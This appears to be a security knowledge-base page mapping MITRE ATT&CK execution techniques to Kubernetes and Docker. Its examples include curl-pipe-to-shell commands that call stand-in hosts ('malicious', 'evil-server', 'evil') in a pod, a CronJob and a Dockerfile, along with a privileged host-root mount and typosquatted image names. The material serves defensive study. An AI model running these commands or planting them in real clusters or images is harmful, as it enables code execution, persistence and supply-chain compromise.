# Execution

### **Execution Techniques in Containerized Environments**

In Kubernetes and other containerized ecosystems, adversaries use Execution techniques to run code within the environment. This includes using Kubernetes-native mechanisms like Jobs or Pods, injecting malicious container images, or abusing container admin commands through exposed APIs or misconfigured RBAC. Execution may happen post-initial access or as a pivot point within the cluster.

#### Container Administration Command (T1609)

**Description**: Use of legitimate administrative tooling (e.g., Docker CLI, `kubectl`) to execute commands inside containers or manage resources.

**Container Example**:

*   After gaining access to a compromised container or host, the attacker uses:

    ```bash
    docker exec -it <container-id> /bin/bash
    kubectl exec -it <pod-name> -- /bin/sh
    ```
* Run malicious binaries directly inside a running pod or container.
* Abuse kubelet or CRI endpoints (`/exec`, `/run`) to spawn processes inside containers without `kubectl`.

**Attack Path**:

* Attacker pivots from API access to container shell access, downloads payloads or sets up persistence.

#### Deploy Container (T1610)

**Description**: Launch a new container as a method to execute code with attacker-specified parameters, volumes, or environment variables.

**Container Example**:

*   Use `kubectl run` or `kubectl create deployment` to spin up a container running malware:

    ```bash
    kubectl run evil-pod --image=alpine --command -- /bin/sh -c "curl http://malicious/payload.sh | sh"
    ```
*   On Docker:

    ```bash
    docker run -v /:/mnt --privileged attacker/image
    ```
* Abuse Helm charts or ArgoCD pipelines to deploy attack infrastructure.

**Use Case**:

* Deploy crypto-mining containers or establish C2 within the cluster using low-detection images.

***

#### Scheduled Task/Job → **Container Orchestration Job** (T1053.007)

**Description**: Use Kubernetes' native scheduled jobs (CronJobs) to trigger recurring or delayed execution.

**Container Example**:

*   Create a CronJob to pull C2 commands or run persistence scripts:

    ```yaml
    apiVersion: batch/v1beta1
    kind: CronJob
    metadata:
      name: recon-job
    spec:
      schedule: "*/5 * * * *"
      jobTemplate:
        spec:
          template:
            spec:
              containers:
              - name: recon
                image: busybox
                command: ["/bin/sh", "-c", "curl http://evil-server/recon.sh | sh"]
              restartPolicy: OnFailure
    ```
* Abuse scheduled tasks to reinstate backdoors or start reverse shells.

**Persistence Layer**:

* These jobs survive pod reboots and cluster changes if not properly monitored.

#### User Execution → **Malicious Image** (T1204.003)

**Description**: Trick users or automation systems into running a malicious container image.

**Container Example**:

* Push a backdoored image to a public or private registry named similarly to a legit one:
  * Legit: `nginx:latest`
  * Evil: `nqinx:latest` (typosquatting)
*   Modify a popular base image (`python`, `node`) with payloads in the `ENTRYPOINT`:

    ```dockerfile
    dockerfileCopyEditFROM python:3.10
    RUN curl http://evil/download.sh | sh
    CMD ["python3"]
    ```
* If build pipelines aren’t validating image sources (e.g., GitHub Actions pulling untrusted images), malicious containers can be executed with CI/CD trust.
